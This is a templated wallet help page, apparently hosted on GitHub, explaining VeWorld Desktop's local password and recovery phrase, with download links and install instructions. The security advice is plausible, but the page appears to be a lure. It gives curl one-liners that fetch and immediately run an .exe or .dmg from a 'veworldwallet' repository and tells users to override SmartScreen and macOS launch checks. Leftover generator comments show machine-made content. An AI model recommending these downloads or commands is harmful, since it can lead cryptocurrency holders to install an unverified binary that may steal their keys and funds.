![VeWorld Desktop](../assets/banner-article.png)

# VeWorld Login: Password and Phrase in VeWorld Desktop

Two credentials, two jobs, and no server in between

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> VeWorld Desktop is actively maintained; run the current release before treating a display problem as a wallet fault.

VeWorld Desktop has two credentials with two different jobs. A local password unlocks the app on your machine and can be changed from inside the app, while the recovery phrase restores the address anywhere and can never be reset by anyone. Signing in is local; there is no account server and no email step.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

The app opens with a password prompt and you are unsure whether that is a login, or you are looking for a "forgot password" route and cannot find one. Both are normal: the password is a local lock, and the phrase is the only thing that survives a lost password.

| Credential | What it unlocks | Where it is set | What happens if lost |
|---|---|---|---|
| Local password | The app on this machine | When the wallet is created or imported | Re-import with the phrase |
| Recovery phrase | The address, on any machine | Written down at setup | No recovery at all |
| <a href="https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md">Ledger device PIN</a> | The keys on the hardware | On the device | Device reset, funds recoverable with the phrase |
| Biometric unlock | Convenience on a phone build | Device settings | Password remains the route |

## Why it happens

A self-custody wallet has nothing to log in to. There is no server holding a session, so "login" means decrypting the local store that holds key material, and the password is the key to that decryption. That is why the app can work with the network off and why a wrong password produces a local error rather than a rejected authentication.

Because the decryption happens on your machine, nobody else can undo it. A support desk cannot reset the password, because it has no copy of the encrypted store and no key to it. The only route back into the address is the phrase, which recreates the key material from scratch instead of decrypting the old copy. Those are genuinely different operations, and conflating them is where most access confusion begins.

The phrase is also what makes the wallet portable. Import it on another machine and the same 0x address appears with the same balances, because the address is derived from the phrase rather than stored beside it. What does not travel is the password: a new installation sets a new local password, and the old one becomes irrelevant.

Biometrics and device PINs sit on top of this model rather than replacing it. A fingerprint unlock is a shortcut past a password prompt on a device that already stores the encrypted material; it does not change who controls the keys. With a Ledger, the device PIN protects the keys themselves, and the wallet's own password only protects its local view. That distinction also explains why restoring on a second machine asks for a new password rather than the old one: the password belongs to one installation, while the phrase belongs to the account and travels with it.

## Fix

1. Open the app and enter the local password to decrypt the wallet on this machine.
2. If the password is rejected, check the keyboard layout and any trailing space before assuming it is wrong.
3. If it is genuinely lost, do not reinstall: choose restore instead and import the <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md">recovery phrase</a>.
4. To change the password while you still have access, use the wallet's own password setting and confirm the phrase is written down first.
5. With a Ledger, connect the device, open the VeChain app, and approve on the device rather than typing a password for signatures.

## If that did not work

If the phrase import is rejected, count the words. Twelve and twenty-four are the usual lengths, and a phrase with one word wrong in the middle fails validation rather than producing an address.

If an imported phrase produces an unexpected address, the derivation path is the difference. Accounts created outside a wallet's default path need the custom path option, and an empty account is the usual symptom.

If the app cannot find an existing wallet after an update, confirm which installation and which user account you are opening. Local storage lives in a specific place, and a different user profile or a fresh install starts empty.

## Prevention

- Write the phrase on paper at setup and keep it somewhere physically separate from the machine.
- Set a password you have not used anywhere else; it protects local storage and is not recoverable.
- Never enter the phrase into a website, a chat or a support form, whoever appears to be asking.
- Note which derivation path an imported account uses, so the next restore lands on the same address.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### Is the password a login to an account?

No. It decrypts the wallet stored on your machine. There is no account to log in to and no server holding a session.

### How does the wallet handle a forgotten password, then?

Through the phrase rather than a reset. Restoring rebuilds the key material and then sets a new local password, which is why the phrase has to exist before it is needed.

### Can I change the password without the phrase?

Only while you still have access, and it is wiser to confirm the phrase first. A password change on a wallet whose phrase is unknown risks locking the only copy.

### Does the phrase expire?

No. It remains valid for as long as the address exists, which is the reason it must never be photographed, emailed or stored in a synced note.

### What does biometric unlock actually protect?

Convenience on a device that already holds the encrypted wallet. It does not change custody, and the password and the phrase remain the routes that matter.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [What to do when the password is gone](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md)
- [How safe the wallet is, and against what](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/is-veworld-wallet-safe-in-veworld-desktop.md)
- [What happens when an unlock gate blocks an update](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-wallet-password-pin-screen-veworld-desktop.md)
- [What VeWorld Desktop is](https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-veworld-desktop.md)
- [Pairing a Ledger when the password is the only gate](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md)